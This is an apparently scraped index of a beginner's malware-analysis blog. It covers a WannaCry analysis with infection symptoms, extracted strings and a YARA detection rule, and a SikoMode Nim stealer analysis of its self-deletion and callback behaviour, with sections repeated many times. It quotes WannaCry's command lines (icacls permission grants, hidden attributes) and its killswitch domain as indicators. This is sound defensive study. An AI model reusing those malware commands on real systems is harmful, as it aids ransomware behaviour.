initial detonation. What are the main symptoms of a WannaCry infection?When detonating WannaCry for the first time, I noticed several symptoms of infection. Different files were created or modified @Please_Read_Me@.txt: it contains a brief explanation of what happened and the instructions on how to fix it (i.e how to pay the ransom and get my files decrypted). @WanaDecryptor@.exe: . this is the binary in charge of decrypting my files when the ransom will be paid. In the meantime, it gives different informations (detailed below). I also noticed that most of my executable files were modified to @WanaDecryptor@.exe. Below you will find a screenshot of the associated window. @WanaDecryptor@.exe.lnk: this is a shortcut to @WanaDecryptor@.exe. I noticed that most of my shortcuts were modified to point on it. @WanaDecryptor@.bmp: this is the new desktop wallpaper that will be replacing . [filename].WNCRY: I noticed most of my files were encrypted and their name appended with this extension. The desktop background has been replaced by this ‚ú®cute‚ú® message : The following pop-up window appeared. It can be spawned manually by executing @WanaDecryptor@.exe. I can see a lot of informations. On the left when will the payment be raised on, when my files will be lost on, what is bitcoin and how to buy it. In the main window informations on what happened to my computer, informations on how to recover my files, informations on how to pay contact details. On the bottom the amount in dollars of the ransom, the bitcoin address to which payment should be sent, a Check Payment button, a Decrypt button. Use FLOSS and extract the strings from the main WannaCry binary. Are there any strings of interest?Using FLOSS, I extracted several interesting strings from the main WannaCry binary. First of all I noticed the following : C:\\%s\\qeriuwjhrf tasksche.exe http://www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com The first string is an absolute path to a file. At this point, I have no idea of what it could be but its name is composed of random letters probably to hide its real meaning and purpose. The second string is the name of an EXE file (tasksche.exe) similar to the official one for the Task Scheduler which is taskschd.exe ü§î. The third string is an URL to a strange website composed of random characters. It‚Äôs probably used later during the execution of the malware. Then, I noticed some more interesting strings associated to cryptography and command execution. CryptGenKey CryptDecrypt CryptEncrypt ... cmd.exe /c \"%s\" icacls . /grant Everyone:F /T /C /Q attrib +h . WNcry@2o17 It looks like this malware is using cryptographic functions from the header wincrypt.h, probably to encrypt files. Also, I can see some system commands like cmd.exe /c or icacls related to file and directory access control lists. and attrib +h . which is setting the hidden file attribute. Additionnally, I noticed the string WNcry@2o17. I don‚Äôt know what is its purpose but from my perspective it looks like a password or something like that. I also noticed UNC (Universal Naming Convention) paths. This is a mean to specify location of network resources in the context of a LAN. \\\\172.16.99.5\\IPC$ \\\\192.168.56.20\\IPC$ WanaCrypt0r Here, both of the UNC paths are leading to the IPC$ share. Microsoft officially state : ‚ÄúThe IPC$ share is also known as a null session connection. By using this session, Windows lets anonymous users perform certain activities, such as enumerating the names of domain accounts and network shares.‚Äù So WannaCry is probably enumerating systems for specific informations it needs. WanaCrypt0r is also a string that attracted my attention. I suppose it‚Äôs probably the name of a function or a binary. Finally, these are the last couple of strings I noticed. SMBr SMBs PC NETWORK Program 1.0 LAN MAN1.0 6.1.7601.17514 (win7sp1_rtm.101119-1850) The first couple of strings are related to the usage of the SMB (Se","date":"2023-11-26","objectID":"/malware-analysis-wannacry-pt1/:5:0","series":null,"tags":["Malware","PMAT","WannaCry","Cutter","x64dbg","Procmon"],"title":"Malware Analysis : WannaCry (part 1)","uri":"/malware-analysis-wannacry-pt1/#host-based-indicators-identify-the-host-based-indicators-of-this-malware"},{"categories":["Article"],"content":" Challenge Questions Record any observed symptoms of infection from initial detonation. What are the main symptoms of a WannaCry infection?When detonating WannaCry for the first time, I noticed several symptoms of infection. Different files were created or modified @Please_Read_Me@.txt: it contains a brief explanation of what happened and the instructions on how to fix it (i.e how to pay the ransom and get my files decrypted). @WanaDecryptor@.exe: . this is the binary in charge of decrypting my files when the ransom will be paid. In the meantime, it gives different informations (detailed below). I also noticed that most of my executable files were modified to @WanaDecryptor@.exe. Below you will find a screenshot of the associated window. @WanaDecryptor@.exe.lnk: this is a shortcut to @WanaDecryptor@.exe. I noticed that most of my shortcuts were modified to point on it. @WanaDecryptor@.bmp: this is the new desktop wallpaper that will be replacing . [filename].WNCRY: I noticed most of my files were encrypted and their name appended with this extension. The desktop background has been replaced by this ‚ú®cute‚ú® message : The following pop-up window appeared. It can be spawned manually by executing @WanaDecryptor@.exe. I can see a lot of informations. On the left when will the payment be raised on, when my files will be lost on, what is bitcoin and how to buy it. In the main window informations on what happened to my computer, informations on how to recover my files, informations on how to pay contact details. On the bottom the amount in dollars of the ransom, the bitcoin address to which payment should be sent, a Check Payment button, a Decrypt button. Use FLOSS and extract the strings from the main WannaCry binary. Are there any strings of interest?Using FLOSS, I extracted several interesting strings from the main WannaCry binary. First of all I noticed the following : C:\\%s\\qeriuwjhrf tasksche.exe http://www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com The first string is an absolute path to a file. At this point, I have no idea of what it could be but its name is composed of random letters probably to hide its real meaning and purpose. The second string is the name of an EXE file (tasksche.exe) similar to the official one for the Task Scheduler which is taskschd.exe ü§î. The third string is an URL to a strange website composed of random characters. It‚Äôs probably used later during the execution of the malware. Then, I noticed some more interesting strings associated to cryptography and command execution. CryptGenKey CryptDecrypt CryptEncrypt ... cmd.exe /c \"%s\" icacls . /grant Everyone:F /T /C /Q attrib +h . WNcry@2o17 It looks like this malware is using cryptographic functions from the header wincrypt.h, probably to encrypt files. Also, I can see some system commands like cmd.exe /c or icacls related to file and directory access control lists. and attrib +h . which is setting the hidden file attribute. Additionnally, I noticed the string WNcry@2o17. I don‚Äôt know what is its purpose but from my perspective it looks like a password or something like that. I also noticed UNC (Universal Naming Convention) paths. This is a mean to specify location of network resources in the context of a LAN. \\\\172.16.99.5\\IPC$ \\\\192.168.56.20\\IPC$ WanaCrypt0r Here, both of the UNC paths are leading to the IPC$ share. Microsoft officially state : ‚ÄúThe IPC$ share is also known as a null session connection. By using this session, Windows lets anonymous users perform certain activities, such as enumerating the names of domain accounts and network shares.‚Äù So WannaCry is probably enumerating systems for specific informations it needs. WanaCrypt0r is also a string that attracted my attention. I suppose it‚Äôs probably the name of a function or a binary. Finally, these are the last couple of strings I noticed. SMBr SMBs PC NETWORK Program 1.0 LAN MAN1.0 6.1.7601.17514 (win7sp1_rtm.101119-1850) The first couple of strings are related to the usage of the SMB (Se","date":"2023-11-26","objectID":"/malware-analysis-wannacry-pt1/:5:0","series":null,"tags":["Malware","PMAT","WannaCry","Cutter","x64dbg","Procmon"],"title":"Malware Analysis : WannaCry (part 1)","uri":"/malware-analysis-wannacry-pt1/#use-cutter-to-locate-the-killswitch-mechanism-in-the-decompiled-code-and-explain-how-it-functions"},{"categories":["Article"],"content":" YARA Rule rule WannaCry { meta: description = \"YARA Rule for WannaCry detection\" author = \"hashp4 (and inspired by Florian Roth)\" date = \"2023-11-27\" hash = \"24d004a104d4d54034dbcffc2a4b19a11f39008a575aa614ea04703480b1022c\" strings: $string1 = \"icacls . /grant Everyone:F /T /C /Q\" fullword ascii $string2 = \"tasksche.exe\" fullword ascii $string3 = \"attrib +h .\" fullword ascii $string5 = \"WNcry@2ol7\" fullword ascii $string6 = \"www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com\" ascii $string8 = \"C:\\\\%s\\\\qeriuwjhrf\" fullword ascii $unc1 = \"\\\\\\\\192.168.56.20\\\\IPC$\" fullword wide $unc2 = \"\\\\\\\\172.16.99.5\\\\IPC$\" fullword wide condition: ( 1 of ($string*) and 1 of ($unc*) ) and filesize \u003c 10000KB } ","date":"2023-11-26","objectID":"/malware-analysis-wannacry-pt1/:6:0","series":null,"tags":["Malware","PMAT","WannaCry","Cutter","x64dbg","Procmon"],"title":"Malware Analysis : WannaCry (part 1)","uri":"/malware-analysis-wannacry-pt1/#yara-rule"},{"categories":["Article"],"content":" ConclusionFor this course, that was the last question. But I‚Äôm really interested in how WannaCry is working and I want to explore deeper into this malware. So, this blog post will have a second part to add bonus explanation by answering more questions such as: What is the purpose of the other embedded binaries (Tor included ü§ó)? How does WannaCry unpack its resources? How does the encryption mechanism works and takes place? Is it possible to decrypt the files even if we don‚Äôt pay the ransom? I hope you enjoyed this blog post and that it could help understand how WannaCry is acting. Do not hesitate to reach me out if you have any questions or if I made any mistakes in defining concepts or using technical terms. I‚Äôm still a newbie to this domain and I‚Äôd be happy to have feedbacks from more experienced analysts. üíú PS: In a couple of days or weeks, I‚Äôll probably start the exam and try to be PJMR (Practical Junior Malware Researcher) certified. In the meantime, I will train on different malware samples so I won‚Äôt be able to go back on WannaCry for some time. ^_~ Thanks for reading me and see you soon ! üëã ","date":"2023-11-26","objectID":"/malware-analysis-wannacry-pt1/:7:0","series":null,"tags":["Malware","PMAT","WannaCry","Cutter","x64dbg","Procmon"],"title":"Malware Analysis : WannaCry (part 1)","uri":"/malware-analysis-wannacry-pt1/#conclusion"},{"categories":["Article"],"content":" Difficulty Start Date \u0026 Time Finish Date \u0026 Time Medium 15/11/2023 - 18h00 18/11/2023 - 21h00 ","date":"2023-11-21","objectID":"/malware-analysis-sikomode/:0:0","series":null,"tags":["Malware","PMAT","Cutter","x64dbg"],"title":"Malware Analysis : SikoMode","uri":"/malware-analysis-sikomode/#"},{"categories":["Article"],"content":" Instructions Analyst, This specimen came from a poor decision and a link that should not have been clicked on. No surprises there. We need to figure out the extent of what this thing can do. It looks a little advanced. Perform a full analysis and send us the report when done. We need to go in depth on this one to determine what it is doing, so break out your decompiler and debugger and get to work! IR Team ","date":"2023-11-21","objectID":"/malware-analysis-sikomode/:1:0","series":null,"tags":["Malware","PMAT","Cutter","x64dbg"],"title":"Malware Analysis : SikoMode","uri":"/malware-analysis-sikomode/#instructions"},{"categories":["Article"],"content":" Tools","date":"2023-11-21","objectID":"/malware-analysis-sikomode/:2:0","series":null,"tags":["Malware","PMAT","Cutter","x64dbg"],"title":"Malware Analysis : SikoMode","uri":"/malware-analysis-sikomode/#tools"},{"categories":["Article"],"content":" Basic Static Analysis File hashes VirusTotal FLOSS PEStudio PEView Wireshark Inetsim Netcat TCPView Procmon ","date":"2023-11-21","objectID":"/malware-analysis-sikomode/:2:1","series":null,"tags":["Malware","PMAT","Cutter","x64dbg"],"title":"Malware Analysis : SikoMode","uri":"/malware-analysis-sikomode/#basic-static-analysis"},{"categories":["Article"],"content":" Advanced Analysis Cutter Debugger (x64dbg) ","date":"2023-11-21","objectID":"/malware-analysis-sikomode/:2:2","series":null,"tags":["Malware","PMAT","Cutter","x64dbg"],"title":"Malware Analysis : SikoMode","uri":"/malware-analysis-sikomode/#advanced-analysis"},{"categories":["Article"],"content":" Basic FactsI started by getting the SHA256 of the file and searched for it on VirusTotal. SHA256: 3ACA2A08CF296F1845D6171958EF0FFD1C8BDFC3E48BDD34A605CB1F7468213E As I thought, the file was flagged as malicious. But for the purpose of this challenge, I didn‚Äôt take it in consideration in order to find everything by myself, as if the sample was a fresh new one. I also ‚ÄúFLOSSed‚Äù the binary to find some interesting strings. I searched for common pattern with grep like C:/, http://, .exe, .txt, .com or even .local. This allowed me to find some interesting strings : Now that the basic tasks are done, let‚Äôs dissect this binary to see what‚Äôs inside and how it works ! üëΩ ","date":"2023-11-21","objectID":"/malware-analysis-sikomode/:3:0","series":null,"tags":["Malware","PMAT","Cutter","x64dbg"],"title":"Malware Analysis : SikoMode","uri":"/malware-analysis-sikomode/#basic-facts"},{"categories":["Article"],"content":" Questions 1) What language is the binary written in?To know what language is the binary written in, I simply loaded it into Cutter. Then on the Dashboard tab, there is plenty of informations including the one I‚Äôm looking for. As you can see on the screenshot below, the malware has been written in Nim. As I wasn‚Äôt very sure about what Nim looked like, I searched some more informations on the Internet. Apparently, Nim was created to be a language as fast as C, as expressive as Python and as extensible as Lisp. Usually, malware authors use C or C++, Visual Basic and even Rust. Why bother using this language ? It‚Äôs because using a new programming language allow to bypass / avoid anti-malware protections. Indeed, at the beginning of its usage it wasn‚Äôt known from the AVs. Thus, there wasn‚Äôt any protections on hosts and it could run without being flagged. Fortunately, this is not the case anymore, to the extent that even legitimate Nim binary are being flagged, making it hard for developpers using this language as I read here: https://forum.nim-lang.org/t/9850. Also, when searching for the keyword Nim on Github, the third most popular repository is the OffensiveNim one. It shows that this language is pretty much used in offensive scenarios. It is also possible to know the language by analyzing the strings in the binary. Indeed, when using strings or FLOSS, I saw that a lot of them started by nim like nimMain, nimGetProcAddr and so on. 2) What is the architecture of this binary?To know what is the architecture of this binary, I opened it in PEStudio. As you can see on the screenshot below, it‚Äôs 64-bits. Cutter was also showing it in the Dashboard tab. 3) Under what conditions can you get the binary to delete itself?I noticed there was three different conditions under which the binary delete itself. Firstly, it will delete itself if the binary doesn‚Äôt have access to the internet and can‚Äôt contact the callback domain. WHat it does is send a TCP request on port 80 to the gateway. Then, there‚Äôs a DNS request to the domain update.ec12-4-109-278-3-ubuntu20-04.local. If it fails, i.e there‚Äôs no answers, it delete itself. I can confirm that supposition by inspecting the binary in Cutter. After displaying the graph of the sym.NimMainModule method, I noticed the following condition : On that screenshot, you can see the function checkKillSwitchURL being called. This is the one that will get the binary to send a request to the callback domain. Then there is the instruction test al, al followed by jne which is a conditional jump depending of the value of the ZF register. If it is equal to 0, meaning it returns true, it will continue its execution. Otherwise, it will delete itself by calling the houdini function (we will describe it later on, just assume this function is making the binary delete itself) If the internet connection gets interrupted, the binary will also delete itself. I noticed that by stopping INetSim during its execution. But there‚Äôs also a confirmation in the disassembled code in Cutter. This is the continuation of the previous screenshot. The checkKillSwitchURL returned true and the execution continues. Here you can see there‚Äôs again a test instruction followed by a jne instruction. This time, if the ZF regsiter is set to 0, it will call houdini and delete itself. Otherwise, it will continue its execution and call the unpackResources and stealStuff functions which is the normal execution of the binary. Thirdly, the binary will delete itself after its normal execution. Aswell as the two previous cases, I can verify that on Cutter : You can see that in both cases, the binary will call the houdini function, which means it‚Äôs bound to get rid of itself anyway. 4) Does the binary persist? If so, how?During my analysis, I didn‚Äôt find any persistance mechanism. On the contrary, it seems the binary is deleting itself after it did everything it needed to do (noticed by dynamic analysis in the previous question). 5) What is the first call","date":"2023-11-21","objectID":"/malware-analysis-sikomode/:4:0","series":null,"tags":["Malware","PMAT","Cutter","x64dbg"],"title":"Malware Analysis : SikoMode","uri":"/malware-analysis-sikomode/#questions"},{"categories":["Article"],"content":" Questions 1) What language is the binary written in?To know what language is the binary written in, I simply loaded it into Cutter. Then on the Dashboard tab, there is plenty of informations including the one I‚Äôm looking for. As you can see on the screenshot below, the malware has been written in Nim. As I wasn‚Äôt very sure about what Nim looked like, I searched some more informations on the Internet. Apparently, Nim was created to be a language as fast as C, as expressive as Python and as extensible as Lisp. Usually, malware authors use C or C++, Visual Basic and even Rust. Why bother using this language ? It‚Äôs because using a new programming language allow to bypass / avoid anti-malware protections. Indeed, at the beginning of its usage it wasn‚Äôt known from the AVs. Thus, there wasn‚Äôt any protections on hosts and it could run without being flagged. Fortunately, this is not the case anymore, to the extent that even legitimate Nim binary are being flagged, making it hard for developpers using this language as I read here: https://forum.nim-lang.org/t/9850. Also, when searching for the keyword Nim on Github, the third most popular repository is the OffensiveNim one. It shows that this language is pretty much used in offensive scenarios. It is also possible to know the language by analyzing the strings in the binary. Indeed, when using strings or FLOSS, I saw that a lot of them started by nim like nimMain, nimGetProcAddr and so on. 2) What is the architecture of this binary?To know what is the architecture of this binary, I opened it in PEStudio. As you can see on the screenshot below, it‚Äôs 64-bits. Cutter was also showing it in the Dashboard tab. 3) Under what conditions can you get the binary to delete itself?I noticed there was three different conditions under which the binary delete itself. Firstly, it will delete itself if the binary doesn‚Äôt have access to the internet and can‚Äôt contact the callback domain. WHat it does is send a TCP request on port 80 to the gateway. Then, there‚Äôs a DNS request to the domain update.ec12-4-109-278-3-ubuntu20-04.local. If it fails, i.e there‚Äôs no answers, it delete itself. I can confirm that supposition by inspecting the binary in Cutter. After displaying the graph of the sym.NimMainModule method, I noticed the following condition : On that screenshot, you can see the function checkKillSwitchURL being called. This is the one that will get the binary to send a request to the callback domain. Then there is the instruction test al, al followed by jne which is a conditional jump depending of the value of the ZF register. If it is equal to 0, meaning it returns true, it will continue its execution. Otherwise, it will delete itself by calling the houdini function (we will describe it later on, just assume this function is making the binary delete itself) If the internet connection gets interrupted, the binary will also delete itself. I noticed that by stopping INetSim during its execution. But there‚Äôs also a confirmation in the disassembled code in Cutter. This is the continuation of the previous screenshot. The checkKillSwitchURL returned true and the execution continues. Here you can see there‚Äôs again a test instruction followed by a jne instruction. This time, if the ZF regsiter is set to 0, it will call houdini and delete itself. Otherwise, it will continue its execution and call the unpackResources and stealStuff functions which is the normal execution of the binary. Thirdly, the binary will delete itself after its normal execution. Aswell as the two previous cases, I can verify that on Cutter : You can see that in both cases, the binary will call the houdini function, which means it‚Äôs bound to get rid of itself anyway. 4) Does the binary persist? If so, how?During my analysis, I didn‚Äôt find any persistance mechanism. On the contrary, it seems the binary is deleting itself after it did everything it needed to do (noticed by dynamic analysis in the previous question). 5) What is the first call","date":"2023-11-21","objectID":"/malware-analysis-sikomode/:4:0","series":null,"tags":["Malware","PMAT","Cutter","x64dbg"],"title":"Malware Analysis : SikoMode","uri":"/malware-analysis-sikomode/#1-what-language-is-the-binary-written-in"},{"categories":["Article"],"content":" Questions 1) What language is the binary written in?To know what language is the binary written in, I simply loaded it into Cutter. Then on the Dashboard tab, there is plenty of informations including the one I‚Äôm looking for. As you can see on the screenshot below, the malware has been written in Nim. As I wasn‚Äôt very sure about what Nim looked like, I searched some more informations on the Internet. Apparently, Nim was created to be a language as fast as C, as expressive as Python and as extensible as Lisp. Usually, malware authors use C or C++, Visual Basic and even Rust. Why bother using this language ? It‚Äôs because using a new programming language allow to bypass / avoid anti-malware protections. Indeed, at the beginning of its usage it wasn‚Äôt known from the AVs. Thus, there wasn‚Äôt any protections on hosts and it could run without being flagged. Fortunately, this is not the case anymore, to the extent that even legitimate Nim binary are being flagged, making it hard for developpers using this language as I read here: https://forum.nim-lang.org/t/9850. Also, when searching for the keyword Nim on Github, the third most popular repository is the OffensiveNim one. It shows that this language is pretty much used in offensive scenarios. It is also possible to know the language by analyzing the strings in the binary. Indeed, when using strings or FLOSS, I saw that a lot of them started by nim like nimMain, nimGetProcAddr and so on. 2) What is the architecture of this binary?To know what is the architecture of this binary, I opened it in PEStudio. As you can see on the screenshot below, it‚Äôs 64-bits. Cutter was also showing it in the Dashboard tab. 3) Under what conditions can you get the binary to delete itself?I noticed there was three different conditions under which the binary delete itself. Firstly, it will delete itself if the binary doesn‚Äôt have access to the internet and can‚Äôt contact the callback domain. WHat it does is send a TCP request on port 80 to the gateway. Then, there‚Äôs a DNS request to the domain update.ec12-4-109-278-3-ubuntu20-04.local. If it fails, i.e there‚Äôs no answers, it delete itself. I can confirm that supposition by inspecting the binary in Cutter. After displaying the graph of the sym.NimMainModule method, I noticed the following condition : On that screenshot, you can see the function checkKillSwitchURL being called. This is the one that will get the binary to send a request to the callback domain. Then there is the instruction test al, al followed by jne which is a conditional jump depending of the value of the ZF register. If it is equal to 0, meaning it returns true, it will continue its execution. Otherwise, it will delete itself by calling the houdini function (we will describe it later on, just assume this function is making the binary delete itself) If the internet connection gets interrupted, the binary will also delete itself. I noticed that by stopping INetSim during its execution. But there‚Äôs also a confirmation in the disassembled code in Cutter. This is the continuation of the previous screenshot. The checkKillSwitchURL returned true and the execution continues. Here you can see there‚Äôs again a test instruction followed by a jne instruction. This time, if the ZF regsiter is set to 0, it will call houdini and delete itself. Otherwise, it will continue its execution and call the unpackResources and stealStuff functions which is the normal execution of the binary. Thirdly, the binary will delete itself after its normal execution. Aswell as the two previous cases, I can verify that on Cutter : You can see that in both cases, the binary will call the houdini function, which means it‚Äôs bound to get rid of itself anyway. 4) Does the binary persist? If so, how?During my analysis, I didn‚Äôt find any persistance mechanism. On the contrary, it seems the binary is deleting itself after it did everything it needed to do (noticed by dynamic analysis in the previous question). 5) What is the first call","date":"2023-11-21","objectID":"/malware-analysis-sikomode/:4:0","series":null,"tags":["Malware","PMAT","Cutter","x64dbg"],"title":"Malware Analysis : SikoMode","uri":"/malware-analysis-sikomode/#2-what-is-the-architecture-of-this-binary"},{"categories":["Article"],"content":" Questions 1) What language is the binary written in?To know what language is the binary written in, I simply loaded it into Cutter. Then on the Dashboard tab, there is plenty of informations including the one I‚Äôm looking for. As you can see on the screenshot below, the malware has been written in Nim. As I wasn‚Äôt very sure about what Nim looked like, I searched some more informations on the Internet. Apparently, Nim was created to be a language as fast as C, as expressive as Python and as extensible as Lisp. Usually, malware authors use C or C++, Visual Basic and even Rust. Why bother using this language ? It‚Äôs because using a new programming language allow to bypass / avoid anti-malware protections. Indeed, at the beginning of its usage it wasn‚Äôt known from the AVs. Thus, there wasn‚Äôt any protections on hosts and it could run without being flagged. Fortunately, this is not the case anymore, to the extent that even legitimate Nim binary are being flagged, making it hard for developpers using this language as I read here: https://forum.nim-lang.org/t/9850. Also, when searching for the keyword Nim on Github, the third most popular repository is the OffensiveNim one. It shows that this language is pretty much used in offensive scenarios. It is also possible to know the language by analyzing the strings in the binary. Indeed, when using strings or FLOSS, I saw that a lot of them started by nim like nimMain, nimGetProcAddr and so on. 2) What is the architecture of this binary?To know what is the architecture of this binary, I opened it in PEStudio. As you can see on the screenshot below, it‚Äôs 64-bits. Cutter was also showing it in the Dashboard tab. 3) Under what conditions can you get the binary to delete itself?I noticed there was three different conditions under which the binary delete itself. Firstly, it will delete itself if the binary doesn‚Äôt have access to the internet and can‚Äôt contact the callback domain. WHat it does is send a TCP request on port 80 to the gateway. Then, there‚Äôs a DNS request to the domain update.ec12-4-109-278-3-ubuntu20-04.local. If it fails, i.e there‚Äôs no answers, it delete itself. I can confirm that supposition by inspecting the binary in Cutter. After displaying the graph of the sym.NimMainModule method, I noticed the following condition : On that screenshot, you can see the function checkKillSwitchURL being called. This is the one that will get the binary to send a request to the callback domain. Then there is the instruction test al, al followed by jne which is a conditional jump depending of the value of the ZF register. If it is equal to 0, meaning it returns true, it will continue its execution. Otherwise, it will delete itself by calling the houdini function (we will describe it later on, just assume this function is making the binary delete itself) If the internet connection gets interrupted, the binary will also delete itself. I noticed that by stopping INetSim during its execution. But there‚Äôs also a confirmation in the disassembled code in Cutter. This is the continuation of the previous screenshot. The checkKillSwitchURL returned true and the execution continues. Here you can see there‚Äôs again a test instruction followed by a jne instruction. This time, if the ZF regsiter is set to 0, it will call houdini and delete itself. Otherwise, it will continue its execution and call the unpackResources and stealStuff functions which is the normal execution of the binary. Thirdly, the binary will delete itself after its normal execution. Aswell as the two previous cases, I can verify that on Cutter : You can see that in both cases, the binary will call the houdini function, which means it‚Äôs bound to get rid of itself anyway. 4) Does the binary persist? If so, how?During my analysis, I didn‚Äôt find any persistance mechanism. On the contrary, it seems the binary is deleting itself after it did everything it needed to do (noticed by dynamic analysis in the previous question). 5) What is the first call","date":"2023-11-21","objectID":"/malware-analysis-sikomode/:4:0","series":null,"tags":["Malware","PMAT","Cutter","x64dbg"],"title":"Malware Analysis : SikoMode","uri":"/malware-analysis-sikomode/#3-under-what-conditions-can-you-get-the-binary-to-delete-itself"},{"categories":["Article"],"content":" Questions 1) What language is the binary written in?To know what language is the binary written in, I simply loaded it into Cutter. Then on the Dashboard tab, there is plenty of informations including the one I‚Äôm looking for. As you can see on the screenshot below, the malware has been written in Nim. As I wasn‚Äôt very sure about what Nim looked like, I searched some more informations on the Internet. Apparently, Nim was created to be a language as fast as C, as expressive as Python and as extensible as Lisp. Usually, malware authors use C or C++, Visual Basic and even Rust. Why bother using this language ? It‚Äôs because using a new programming language allow to bypass / avoid anti-malware protections. Indeed, at the beginning of its usage it wasn‚Äôt known from the AVs. Thus, there wasn‚Äôt any protections on hosts and it could run without being flagged. Fortunately, this is not the case anymore, to the extent that even legitimate Nim binary are being flagged, making it hard for developpers using this language as I read here: https://forum.nim-lang.org/t/9850. Also, when searching for the keyword Nim on Github, the third most popular repository is the OffensiveNim one. It shows that this language is pretty much used in offensive scenarios. It is also possible to know the language by analyzing the strings in the binary. Indeed, when using strings or FLOSS, I saw that a lot of them started by nim like nimMain, nimGetProcAddr and so on. 2) What is the architecture of this binary?To know what is the architecture of this binary, I opened it in PEStudio. As you can see on the screenshot below, it‚Äôs 64-bits. Cutter was also showing it in the Dashboard tab. 3) Under what conditions can you get the binary to delete itself?I noticed there was three different conditions under which the binary delete itself. Firstly, it will delete itself if the binary doesn‚Äôt have access to the internet and can‚Äôt contact the callback domain. WHat it does is send a TCP request on port 80 to the gateway. Then, there‚Äôs a DNS request to the domain update.ec12-4-109-278-3-ubuntu20-04.local. If it fails, i.e there‚Äôs no answers, it delete itself. I can confirm that supposition by inspecting the binary in Cutter. After displaying the graph of the sym.NimMainModule method, I noticed the following condition : On that screenshot, you can see the function checkKillSwitchURL being called. This is the one that will get the binary to send a request to the callback domain. Then there is the instruction test al, al followed by jne which is a conditional jump depending of the value of the ZF register. If it is equal to 0, meaning it returns true, it will continue its execution. Otherwise, it will delete itself by calling the houdini function (we will describe it later on, just assume this function is making the binary delete itself) If the internet connection gets interrupted, the binary will also delete itself. I noticed that by stopping INetSim during its execution. But there‚Äôs also a confirmation in the disassembled code in Cutter. This is the continuation of the previous screenshot. The checkKillSwitchURL returned true and the execution continues. Here you can see there‚Äôs again a test instruction followed by a jne instruction. This time, if the ZF regsiter is set to 0, it will call houdini and delete itself. Otherwise, it will continue its execution and call the unpackResources and stealStuff functions which is the normal execution of the binary. Thirdly, the binary will delete itself after its normal execution. Aswell as the two previous cases, I can verify that on Cutter : You can see that in both cases, the binary will call the houdini function, which means it‚Äôs bound to get rid of itself anyway. 4) Does the binary persist? If so, how?During my analysis, I didn‚Äôt find any persistance mechanism. On the contrary, it seems the binary is deleting itself after it did everything it needed to do (noticed by dynamic analysis in the previous question). 5) What is the first call","date":"2023-11-21","objectID":"/malware-analysis-sikomode/:4:0","series":null,"tags":["Malware","PMAT","Cutter","x64dbg"],"title":"Malware Analysis : SikoMode","uri":"/malware-analysis-sikomode/#4-does-the-binary-persist-if-so-how"},{"categories":["Article"],"content":" Questions 1) What language is the binary written in?To know what language is the binary written in, I simply loaded it into Cutter. Then on the Dashboard tab, there is plenty of informations including the one I‚Äôm looking for. As you can see on the screenshot below, the malware has been written in Nim. As I wasn‚Äôt very sure about what Nim looked like, I searched some more informations on the Internet. Apparently, Nim was created to be a language as fast as C, as expressive as Python and as extensible as Lisp. Usually, malware authors use C or C++, Visual Basic and even Rust. Why bother using this language ? It‚Äôs because using a new programming language allow to bypass / avoid anti-malware protections. Indeed, at the beginning of its usage it wasn‚Äôt known from the AVs. Thus, there wasn‚Äôt any protections on hosts and it could run without being flagged. Fortunately, this is not the case anymore, to the extent that even legitimate Nim binary are being flagged, making it hard for developpers using this language as I read here: https://forum.nim-lang.org/t/9850. Also, when searching for the keyword Nim on Github, the third most popular repository is the OffensiveNim one. It shows that this language is pretty much used in offensive scenarios. It is also possible to know the language by analyzing the strings in the binary. Indeed, when using strings or FLOSS, I saw that a lot of them started by nim like nimMain, nimGetProcAddr and so on. 2) What is the architecture of this binary?To know what is the architecture of this binary, I opened it in PEStudio. As you can see on the screenshot below, it‚Äôs 64-bits. Cutter was also showing it in the Dashboard tab. 3) Under what conditions can you get the binary to delete itself?I noticed there was three different conditions under which the binary delete itself. Firstly, it will delete itself if the binary doesn‚Äôt have access to the internet and can‚Äôt contact the callback domain. WHat it does is send a TCP request on port 80 to the gateway. Then, there‚Äôs a DNS request to the domain update.ec12-4-109-278-3-ubuntu20-04.local. If it fails, i.e there‚Äôs no answers, it delete itself. I can confirm that supposition by inspecting the binary in Cutter. After displaying the graph of the sym.NimMainModule method, I noticed the following condition : On that screenshot, you can see the function checkKillSwitchURL being called. This is the one that will get the binary to send a request to the callback domain. Then there is the instruction test al, al followed by jne which is a conditional jump depending of the value of the ZF register. If it is equal to 0, meaning it returns true, it will continue its execution. Otherwise, it will delete itself by calling the houdini function (we will describe it later on, just assume this function is making the binary delete itself) If the internet connection gets interrupted, the binary will also delete itself. I noticed that by stopping INetSim during its execution. But there‚Äôs also a confirmation in the disassembled code in Cutter. This is the continuation of the previous screenshot. The checkKillSwitchURL returned true and the execution continues. Here you can see there‚Äôs again a test instruction followed by a jne instruction. This time, if the ZF regsiter is set to 0, it will call houdini and delete itself. Otherwise, it will continue its execution and call the unpackResources and stealStuff functions which is the normal execution of the binary. Thirdly, the binary will delete itself after its normal execution. Aswell as the two previous cases, I can verify that on Cutter : You can see that in both cases, the binary will call the houdini function, which means it‚Äôs bound to get rid of itself anyway. 4) Does the binary persist? If so, how?During my analysis, I didn‚Äôt find any persistance mechanism. On the contrary, it seems the binary is deleting itself after it did everything it needed to do (noticed by dynamic analysis in the previous question). 5) What is the first call","date":"2023-11-21","objectID":"/malware-analysis-sikomode/:4:0","series":null,"tags":["Malware","PMAT","Cutter","x64dbg"],"title":"Malware Analysis : SikoMode","uri":"/malware-analysis-sikomode/#5-what-is-the-first-callback-domain"},{"categories":["Article"],"content":" Questions 1) What language is the binary written in?To know what language is the binary written in, I simply loaded it into Cutter. Then on the Dashboard tab, there is plenty of informations including the one I‚Äôm looking for. As you can see on the screenshot below, the malware has been written in Nim. As I wasn‚Äôt very sure about what Nim looked like, I searched some more informations on the Internet. Apparently, Nim was created to be a language as fast as C, as expressive as Python and as extensible as Lisp. Usually, malware authors use C or C++, Visual Basic and even Rust. Why bother using this language ? It‚Äôs because using a new programming language allow to bypass / avoid anti-malware protections. Indeed, at the beginning of its usage it wasn‚Äôt known from the AVs. Thus, there wasn‚Äôt any protections on hosts and it could run without being flagged. Fortunately, this is not the case anymore, to the extent that even legitimate Nim binary are being flagged, making it hard for developpers using this language as I read here: https://forum.nim-lang.org/t/9850. Also, when searching for the keyword Nim on Github, the third most popular repository is the OffensiveNim one. It shows that this language is pretty much used in offensive scenarios. It is also possible to know the language by analyzing the strings in the binary. Indeed, when using strings or FLOSS, I saw that a lot of them started by nim like nimMain, nimGetProcAddr and so on. 2) What is the architecture of this binary?To know what is the architecture of this binary, I opened it in PEStudio. As you can see on the screenshot below, 